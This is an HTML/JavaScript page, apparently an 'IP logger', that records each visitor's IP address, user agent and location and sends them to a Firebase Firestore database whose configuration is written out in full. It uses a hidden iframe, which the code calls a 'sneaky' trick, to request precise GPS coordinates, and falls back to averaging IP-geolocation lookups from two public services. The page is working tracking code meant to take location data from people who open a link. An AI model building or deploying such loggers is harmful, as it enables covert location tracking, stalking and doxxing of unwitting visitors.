<!DOCTYPE html>
<html>
<head>
  <title>IP Logger with iframe GPS trick + fallback</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
</head>
<body>
<h3>Logging your IP and location...</h3>
<script>
  const firebaseConfig = {
    apiKey: "AIzaSyBmeCiF-qqHkaM81Jq-whaxvz4zJ6Ni3R0",
    authDomain: "yachad-32fe3.firebaseapp.com",
    databaseURL: "https://yachad-32fe3-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "yachad-32fe3",
    storageBucket: "yachad-32fe3.firebasestorage.app",
    messagingSenderId: "720032034735",
    appId: "1:720032034735:web:cabedda1dc842420bbc95a",
    measurementId: "G-YH1NK3RHY3"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  // Helper to fetch visitor IP
  async function getVisitorIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip || "unknown";
    } catch {
      return "unknown";
    }
  }

  // Save location to Firestore
  function saveToFirestore(lat, lon, ip, source) {
    const ua = navigator.userAgent;
    const time = new Date().toISOString();
    db.collection('ipLogs').add({
      ip: ip,
      userAgent: ua,
      timestamp: time,
      latitude: lat,
      longitude: lon,
      source: source
    }).then(() => {
      document.body.innerHTML = `<p>Your location has been logged using <b>${source}</b>.</p>`;
    }).catch(err => {
      document.body.innerHTML = `<p>Error logging location: ${err}</p>`;
    });
  }

  // IP-based fallback location (average of multiple APIs)
  function fetchLocation(url, parser) {
    return fetch(url)
      .then(res => res.json())
      .then(parser)
      .catch(() => null);
  }

  function parseIpApi(data) {
    return {
      lat: data.lat || null,
      lon: data.lon || null
    };
  }

  function parseIpWhoIs(data) {
    if (data.success === false) return null;
    return {
      lat: data.latitude || null,
      lon: data.longitude || null
    };
  }

  function fallbackToIPLocation(visitorIP) {
    document.body.innerHTML = "<p>Fetching approximate location via IP fallback...</p>";
    Promise.all([
      fetchLocation('https://ip-api.com/json/', parseIpApi),
      fetchLocation('https://ipwho.is/', parseIpWhoIs)
    ]).then(results => {
      const validResults = results.filter(r => r !== null);
      if (validResults.length === 0) {
        document.body.innerHTML = "<p>Failed to fetch location from IP APIs.</p>";
        return;
      }
      let latSum = 0, lonSum = 0, count = 0;
      validResults.forEach(r => {
        if (r.lat !== null && r.lon !== null) {
          latSum += r.lat;
          lonSum += r.lon;
          count++;
        }
      });
      const avgLat = count ? latSum / count : null;
      const avgLon = count ? lonSum / count : null;
      saveToFirestore(avgLat, avgLon, visitorIP, "IP");
    }).catch(err => {
      document.body.innerHTML = `<p>Unexpected error fetching IP location: ${err}</p>`;
    });
  }

  // The sneaky iframe geolocation trick
  async function tryIframeTrick(visitorIP) {
    return new Promise((resolve) => {
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = `data:text/html,<script>
        navigator.geolocation.getCurrentPosition(
          pos => { parent.postMessage({lat: pos.coords.latitude, lon: pos.coords.longitude}, '*'); },
          () => { parent.postMessage({error: true}, '*'); },
          { timeout: 5000, enableHighAccuracy: true }
        );
      <\/script>`;
      document.body.appendChild(iframe);

      function onMessage(event) {
        if (event.data.lat && event.data.lon) {
          saveToFirestore(event.data.lat, event.data.lon, visitorIP, "iframeGPS");
          window.removeEventListener("message", onMessage);
          resolve(true);
        } else {
          window.removeEventListener("message", onMessage);
          resolve(false);
        }
      }
      window.addEventListener("message", onMessage);

      // Timeout fallback in case iframe never responds
      setTimeout(() => {
        window.removeEventListener("message", onMessage);
        resolve(false);
      }, 7000);
    });
  }

  // Main logic: get IP, then try iframe GPS, fallback if denied/unavailable
  (async () => {
    const visitorIP = await getVisitorIP();
    document.body.innerHTML = "<p>Trying sneaky iframe GPS location...</p>";
    const gpsSuccess = await tryIframeTrick(visitorIP);
    if (!gpsSuccess) {
      document.body.innerHTML = "<p>Iframe GPS failed or denied, falling back to IP location.</p>";
      fallbackToIPLocation(visitorIP);
    }
  })();

</script>
</body>
</html>
